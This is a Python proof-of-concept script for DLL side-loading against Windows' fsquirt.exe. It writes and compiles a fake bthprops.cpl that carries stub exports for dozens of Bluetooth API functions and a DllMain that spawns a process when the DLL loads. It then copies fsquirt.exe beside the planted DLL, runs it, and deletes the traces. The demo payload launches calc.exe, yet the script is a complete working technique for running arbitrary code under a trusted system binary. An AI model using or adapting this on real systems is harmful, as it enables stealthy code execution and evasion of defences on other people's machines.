import os
import shutil
import subprocess
import sys
import time

WORK_DIR = r"C:\Temp\FsquirtExploit"
VARSALL_BAT = r"C:\Program Files\Microsoft Visual Studio\18\Professional\VC\Auxiliary\Build\vcvarsall.bat"
FSQUIRT_EXE = r"C:\Windows\System32\fsquirt.exe"
CPL_NAME = "bthprops.cpl"

# Alternative VS paths to try
VS_PATHS = [
    r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvarsall.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat",
    r"C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat",
    r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat",
]

CPL_SOURCE = r'''#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            {
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                CreateProcessA(
                    NULL, "calc.exe", NULL, NULL, FALSE,
                    CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi
                );
                if (pi.hProcess) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

// @104
__declspec(dllexport) DWORD BluetoothAuthenticateDevice(void* hwndParent, void* hRadio, void* pbtdi, void* pszPasskey, ULONG ulPasskeyLength) {
    return ERROR_NOT_SUPPORTED;
}

// @105
__declspec(dllexport) DWORD BluetoothAuthenticateDeviceEx(void* hwndParent, void* hRadio, void* pbtdiInout, void* pbtOobData, void* authenticationRequirement) {
    return ERROR_NOT_SUPPORTED;
}

// @106
__declspec(dllexport) DWORD BluetoothAuthenticateMultipleDevices(void* hwndParent, void* hRadio, DWORD cDevices, void* rgbtdi) {
    return ERROR_NOT_SUPPORTED;
}

// @107
__declspec(dllexport) BOOL BluetoothAuthenticationAgent(void* pbtdi) {
    return FALSE;
}

// @108
__declspec(dllexport) DWORD BluetoothDisconnectDevice(void* pAddress) {
    return ERROR_NOT_SUPPORTED;
}

// @109
__declspec(dllexport) BOOL BluetoothDisplayDeviceProperties(void* hwndParent, void* pbtdi) {
    return FALSE;
}

// @110
__declspec(dllexport) BOOL BluetoothEnableDiscovery(void* hRadio, BOOL fEnabled) {
    return FALSE;
}

// @111
__declspec(dllexport) BOOL BluetoothEnableIncomingConnections(void* hRadio, BOOL fEnabled) {
    return FALSE;
}

// @112
__declspec(dllexport) DWORD BluetoothEnumerateInstalledServices(void* hRadio, void* pbtdi, DWORD* pcServiceInout, void* pGuidServices) {
    return ERROR_NOT_SUPPORTED;
}

// @113
__declspec(dllexport) BOOL BluetoothFindBrowseGroupClose(void* hFind) {
    return FALSE;
}

// @114
__declspec(dllexport) BOOL BluetoothFindClassIdClose(void* hFind) {
    return FALSE;
}

// @115
__declspec(dllexport) BOOL BluetoothFindDeviceClose(void* hFind) {
    return FALSE;
}

// @116
__declspec(dllexport) void* BluetoothFindFirstBrowseGroup(void* pBluetoothSdpSearch, void* pSdpBrowseGroupList) {
    return NULL;
}

// @117
__declspec(dllexport) void* BluetoothFindFirstClassId(void* pBluetoothSdpSearch, void* pClassIdList) {
    return NULL;
}

// @118
__declspec(dllexport) void* BluetoothFindFirstDevice(void* pbtsp, void* pbtdi) {
    return NULL;
}

// @119
__declspec(dllexport) void* BluetoothFindFirstProfileDescriptor(void* pSdpRecord, void* pProfileDescriptorList) {
    return NULL;
}

// @120
__declspec(dllexport) void* BluetoothFindFirstProtocolDescriptorStack(void* pSdpRecord, void* pProtocolDescriptorStack) {
    return NULL;
}

// @121
__declspec(dllexport) void* BluetoothFindFirstProtocolEntry(void* pSdpRecord, void* pProtocolEntry) {
    return NULL;
}

// @122
__declspec(dllexport) void* BluetoothFindFirstRadio(void* pbtfrp, void* phRadio) {
    return NULL;
}

// @123
__declspec(dllexport) void* BluetoothFindFirstService(void* pSearchParams, void* pQuerySet) {
    return NULL;
}

// @124
__declspec(dllexport) void* BluetoothFindFirstServiceEx(void* pSearchParams, void* pQuerySet) {
    return NULL;
}

// @125
__declspec(dllexport) BOOL BluetoothFindNextBrowseGroup(void* hFind, void* pSdpBrowseGroupList) {
    return FALSE;
}

// @126
__declspec(dllexport) BOOL BluetoothFindNextClassId(void* hFind, void* pClassIdList) {
    return FALSE;
}

// @127
__declspec(dllexport) BOOL BluetoothFindNextDevice(void* hFind, void* pbtdi) {
    return FALSE;
}

// @128
__declspec(dllexport) BOOL BluetoothFindNextProfileDescriptor(void* hFind, void* pProfileDescriptorList) {
    return FALSE;
}

// @129
__declspec(dllexport) BOOL BluetoothFindNextProtocolDescriptorStack(void* hFind, void* pProtocolDescriptorStack) {
    return FALSE;
}

// @130
__declspec(dllexport) BOOL BluetoothFindNextProtocolEntry(void* hFind, void* pProtocolEntry) {
    return FALSE;
}

// @131
__declspec(dllexport) BOOL BluetoothFindNextRadio(void* hFind, void* phRadio) {
    return FALSE;
}

// @132
__declspec(dllexport) BOOL BluetoothFindNextService(void* hFind, void* pQuerySet) {
    return FALSE;
}

// @133
__declspec(dllexport) BOOL BluetoothFindProfileDescriptorClose(void* hFind) {
    return FALSE;
}

// @134
__declspec(dllexport) BOOL BluetoothFindProtocolDescriptorStackClose(void* hFind) {
    return FALSE;
}

// @135
__declspec(dllexport) BOOL BluetoothFindProtocolEntryClose(void* hFind) {
    return FALSE;
}

// @136
__declspec(dllexport) BOOL BluetoothFindRadioClose(void* hFind) {
    return FALSE;
}

// @137
__declspec(dllexport) BOOL BluetoothFindServiceClose(void* hFind) {
    return FALSE;
}

// @138
__declspec(dllexport) DWORD BluetoothGetDeviceInfo(void* hRadio, void* pbtdi) {
    return FALSE;
}

// @139
__declspec(dllexport) DWORD BluetoothGetRadioInfo(void* hRadio, void* pRadioInfo) {
    return ERROR_NOT_SUPPORTED;
}

// @140
__declspec(dllexport) BOOL BluetoothIsConnectable(void* hRadio) {
    return FALSE;
}

// @141
__declspec(dllexport) BOOL BluetoothIsDiscoverable(void* hRadio) {
    return FALSE;
}

// @142
__declspec(dllexport) BOOL BluetoothIsVersionAvailable(UCHAR MajorVersion, UCHAR MinorVersion) {
    return FALSE;
}

// @143
__declspec(dllexport) DWORD BluetoothMapClassOfDeviceToIconPath(ULONG ulDeviceClass, void* pszIconPath, DWORD* pcchIconPath) {
    return ERROR_NOT_SUPPORTED;
}

// @144
__declspec(dllexport) DWORD BluetoothMapClassOfDeviceToString(ULONG ulDeviceClass, void* pszMajorString, DWORD cchMajorStringLen, void* pszMinorString, DWORD cchMinorStringLen) {
    return ERROR_NOT_SUPPORTED;
}

// @145
__declspec(dllexport) DWORD BluetoothRegisterForAuthentication(void* pbtdi, void* phRegHandle, void* pfnCallback, void* pvParam) {
    return ERROR_NOT_SUPPORTED;
}

// @146
__declspec(dllexport) DWORD BluetoothRegisterForAuthenticationEx(void* pbtdiIn, void* phRegHandleOut, void* pfnCallbackEx, void* pvParam) {
    return ERROR_NOT_SUPPORTED;
}

// @147
__declspec(dllexport) DWORD BluetoothRemoveDevice(void* pAddress) {
    return ERROR_NOT_SUPPORTED;
}

// @148
__declspec(dllexport) DWORD BluetoothSdpEnumAttributes(void* pSdpRecord, void* pfnCallback, void* pvParam) {
    return ERROR_NOT_SUPPORTED;
}

// @149
__declspec(dllexport) DWORD BluetoothSdpGetAttributeValue(void* pRecordStream, ULONG cbRecordLength, USHORT usAttributeId, void* pAttributeData) {
    return ERROR_NOT_SUPPORTED;
}

// @150
__declspec(dllexport) DWORD BluetoothSdpGetContainerElementData(void* pContainerStream, ULONG cbContainerLength, void* phElement, void* pData) {
    return ERROR_NOT_SUPPORTED;
}

// @151
__declspec(dllexport) DWORD BluetoothSdpGetElementData(void* pSdpStream, ULONG cbSdpStreamLength, void* pData) {
    return ERROR_NOT_SUPPORTED;
}

// @152
__declspec(dllexport) DWORD BluetoothSdpGetString(void* pRecordStream, ULONG cbRecordLength, void* pStringData, USHORT usStringOffset, void* pszString, DWORD* pcchStringLength) {
    return ERROR_NOT_SUPPORTED;
}

// @153
__declspec(dllexport) BOOL BluetoothSelectDevices(void* pbtsdp) {
    return FALSE;
}

// @154
__declspec(dllexport) BOOL BluetoothSelectDevicesFree(void* pbtsdp) {
    return FALSE;
}

// @155
__declspec(dllexport) DWORD BluetoothSendAuthenticationResponse(void* hRadio, void* pbtdi, void* pszPasskey) {
    return ERROR_NOT_SUPPORTED;
}

// @156
__declspec(dllexport) DWORD BluetoothSendAuthenticationResponseEx(void* hRadioIn, void* pauthResponse) {
    return ERROR_NOT_SUPPORTED;
}

// @157
__declspec(dllexport) DWORD BluetoothSetLocalServiceInfo(void* hRadioIn, void* pClassGuid, ULONG ulInstance, void* pServiceInfoIn) {
    return ERROR_NOT_SUPPORTED;
}

// @158
__declspec(dllexport) DWORD BluetoothSetServiceState(void* hRadio, void* pbtdi, void* pGuidService, DWORD dwServiceFlags) {
    return ERROR_NOT_SUPPORTED;
}

// @159
__declspec(dllexport) BOOL BluetoothUnregisterAuthentication(void* hRegHandle) {
    return FALSE;
}

// @160
__declspec(dllexport) DWORD BluetoothUpdateDeviceRecord(void* pbtdi) {
    return ERROR_NOT_SUPPORTED;
}
'''

CPL_DEF = '''LIBRARY bthprops
EXPORTS
    BluetoothAuthenticateDevice @104
    BluetoothAuthenticateDeviceEx @105
    BluetoothAuthenticateMultipleDevices @106
    BluetoothAuthenticationAgent @107
    BluetoothDisconnectDevice @108
    BluetoothDisplayDeviceProperties @109
    BluetoothEnableDiscovery @110
    BluetoothEnableIncomingConnections @111
    BluetoothEnumerateInstalledServices @112
    BluetoothFindBrowseGroupClose @113
    BluetoothFindClassIdClose @114
    BluetoothFindDeviceClose @115
    BluetoothFindFirstBrowseGroup @116
    BluetoothFindFirstClassId @117
    BluetoothFindFirstDevice @118
    BluetoothFindFirstProfileDescriptor @119
    BluetoothFindFirstProtocolDescriptorStack @120
    BluetoothFindFirstProtocolEntry @121
    BluetoothFindFirstRadio @122
    BluetoothFindFirstService @123
    BluetoothFindFirstServiceEx @124
    BluetoothFindNextBrowseGroup @125
    BluetoothFindNextClassId @126
    BluetoothFindNextDevice @127
    BluetoothFindNextProfileDescriptor @128
    BluetoothFindNextProtocolDescriptorStack @129
    BluetoothFindNextProtocolEntry @130
    BluetoothFindNextRadio @131
    BluetoothFindNextService @132
    BluetoothFindProfileDescriptorClose @133
    BluetoothFindProtocolDescriptorStackClose @134
    BluetoothFindProtocolEntryClose @135
    BluetoothFindRadioClose @136
    BluetoothFindServiceClose @137
    BluetoothGetDeviceInfo @138
    BluetoothGetRadioInfo @139
    BluetoothIsConnectable @140
    BluetoothIsDiscoverable @141
    BluetoothIsVersionAvailable @142
    BluetoothMapClassOfDeviceToIconPath @143
    BluetoothMapClassOfDeviceToString @144
    BluetoothRegisterForAuthentication @145
    BluetoothRegisterForAuthenticationEx @146
    BluetoothRemoveDevice @147
    BluetoothSdpEnumAttributes @148
    BluetoothSdpGetAttributeValue @149
    BluetoothSdpGetContainerElementData @150
    BluetoothSdpGetElementData @151
    BluetoothSdpGetString @152
    BluetoothSelectDevices @153
    BluetoothSelectDevicesFree @154
    BluetoothSendAuthenticationResponse @155
    BluetoothSendAuthenticationResponseEx @156
    BluetoothSetLocalServiceInfo @157
    BluetoothSetServiceState @158
    BluetoothUnregisterAuthentication @159
    BluetoothUpdateDeviceRecord @160
'''


def find_vcvarsall():
    """Find available vcvarsall.bat"""
    for path in VS_PATHS:
        if os.path.exists(path):
            return path
    return None


def write_sources():
    """Write C source and DEF files to work directory"""
    os.makedirs(WORK_DIR, exist_ok=True)
    
    with open(os.path.join(WORK_DIR, 'bthprops.c'), 'w') as f:
        f.write(CPL_SOURCE)
    
    with open(os.path.join(WORK_DIR, 'bthprops.def'), 'w') as f:
        f.write(CPL_DEF)


def build_cpl():
    """Build bthprops.cpl using Visual Studio compiler"""
    vcvars = find_vcvarsall()
    if not vcvars:
        print("[-] Visual Studio not found")
        return None
    
    cmd = (
        f'call "{vcvars}" x64 && '
        f'cl.exe /nologo /LD "{WORK_DIR}\\bthprops.c" '
        f'/link /DEF:"{WORK_DIR}\\bthprops.def" '
        f'/OUT:"{WORK_DIR}\\{CPL_NAME}" '
        f'/SUBSYSTEM:WINDOWS '
        f'kernel32.lib user32.lib'
    )
    
    result = subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=WORK_DIR
    )
    
    cpl_path = os.path.join(WORK_DIR, CPL_NAME)
    if os.path.exists(cpl_path):
        # Strip debug symbols if strip is available
        try:
            subprocess.run(
                ['strip', cpl_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
        except FileNotFoundError:
            pass  # strip not available on Windows without MinGW
        return cpl_path
    
    print(f"[-] Build failed: {result.stderr.decode()}")
    return None


def deploy_and_run(cpl_path):
    """
    Copy fsquirt.exe to work directory and run it.
    fsquirt.exe will load bthprops.cpl from the same directory.
    """
    if not os.path.exists(FSQUIRT_EXE):
        print(f"[-] fsquirt.exe not found at {FSQUIRT_EXE}")
        return False
    
    # Copy fsquirt.exe to work directory (where our bthprops.cpl is)
    local_fsquirt = os.path.join(WORK_DIR, "fsquirt.exe")
    shutil.copy2(FSQUIRT_EXE, local_fsquirt)
    
    # Run fsquirt.exe from work directory - it will load our bthprops.cpl
    try:
        proc = subprocess.Popen(
            [local_fsquirt],
            cwd=WORK_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        # Give it time to load the DLL and spawn calc
        time.sleep(2)
        # Kill fsquirt.exe
        proc.terminate()
        return True
    except Exception as e:
        print(f"[-] Failed to run fsquirt.exe: {e}")
        return False


def cleanup_workdir():
    """Clean up all generated files"""
    if os.path.isdir(WORK_DIR):
        for filename in os.listdir(WORK_DIR):
            file_path = os.path.join(WORK_DIR, filename)
            try:
                if os.path.isdir(file_path):
                    shutil.rmtree(file_path, ignore_errors=True)
                else:
                    os.remove(file_path)
            except OSError:
                pass
        try:
            os.rmdir(WORK_DIR)
        except OSError:
            pass


if __name__ == '__main__':
    print("[*] Fsquirt.exe / bthprops.cpl DLL Sideloading PoC")
    print("[*] Writing source files...")
    write_sources()
    
    print("[*] Building bthprops.cpl...")
    try:
        cpl = build_cpl()
    except subprocess.CalledProcessError as e:
        print(f"[-] Build failed: {e}")
        sys.exit(1)
    
    if not cpl:
        print("[-] Failed to build bthprops.cpl")
        sys.exit(1)
    
    print(f"[+] Built: {cpl}")
    print("[*] Deploying and executing...")
    
    if deploy_and_run(cpl):
        print("[+] Payload executed successfully!")
    else:
        print("[-] Execution failed")
    
    time.sleep(1)
    print("[*] Cleaning up...")
    cleanup_workdir()
    print("[+] Done!")
